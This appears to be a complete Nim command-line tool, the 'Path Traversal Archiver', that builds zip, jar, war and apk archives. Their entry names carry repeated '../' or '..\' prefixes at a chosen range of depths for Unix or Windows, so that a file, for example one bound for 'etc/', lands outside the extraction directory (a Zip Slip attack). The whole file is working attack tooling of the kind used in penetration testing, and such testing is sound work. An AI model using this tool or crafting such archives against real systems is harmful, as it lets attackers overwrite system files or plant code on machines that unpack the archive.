import os
import therapist
import std/tables
import std/streams
import std/sequtils
import std/strutils
import zip/zipfiles

let ext_mode = {".zip":fmWrite, ".jar":fmWrite, ".war":fmWrite, ".apk":fmWrite}.toOrderedTable 
let exts = toSeq(ext_mode.keys)

let args = (
  levels: newStringArg(@["-l", "--levels"], defaultVal="0-10", help="A single level or a range of levels to traverse."),
  os: newStringArg(@["-o", "--os"],  defaultVal="unix", choices = @["unix", "win"], help="Target OS (unix|win)."),
  path: newStringArg(@["-p", "--path"],  defaultVal="", help="Path to include (e.g. 'etc/')."),
  help: newHelpArg(@["-h", "--help"], help="Show this help message and exit"),
  file_to_add: newFileArg(@["<file_to_add>"], help="File to add in the archive."),
  archive: newStringArg(@["<archive>"], help="Archive filename (Supported extensions are .zip, .jar, .war, .apk)."),
)


proc make_traversal_path(path: string, level: int = 0, os: string = "unix"): string =
  if os == "win":
    let traversal = "..\\"
    let fullpath = traversal.repeat(level) & path
    return fullpath.replace("/", "\\").replace("\\\\", "\\") 
  else:
    let traversal = "../"
    let fullpath = traversal.repeat(level) & path
    return fullpath.replace("\\", "/").replace("//", "/")


args.parseOrHelp(prolog="Path Traversal Archiver: A tool to create archives containing path-traversal filenames (e.g. '../../etc/passwd').")

var start = 0
var final = 0
try:
  if "-" in args.levels.value:
    let values = split(args.levels.value, "-")
    start = parseInt(values[0])
    final = parseInt(values[1])
  else:
    start = parseInt(args.levels.value)
    final = start 
except ValueError:
  "Please specify a single level (e.g. 3) or a level range (e.g. 1-10) for path traversal.".quit(-1)

let splittedFile = splitFile(args.archive.value)
let path = args.path.value &  lastPathPart(args.file_to_add.value)

if not ext_mode.hasKey(splittedFile.ext):
  let message = "Please specify a supported extention " & $exts & " in the archive filename: " & args.archive.value
  message.quit(-1)
elif splittedFile.ext in [".zip", ".jar", ".war", ".apk"]:
  echo "Creating archive " & args.archive.value
  var z: ZipArchive
  if z.open(args.archive.value, ext_mode[splittedFile.ext]):
    for i in countup(start, final):
      let fullpath = make_traversal_path(path, level=i, os=args.os.value)
      echo "[+] Adding " & fullpath
      z.addFile(fullpath, newFileStream(args.file_to_add.value, fmRead))
    z.close()
else:
  let message = "Extention '" & splittedFile.ext & "' not supported."
  message.quit(-1)
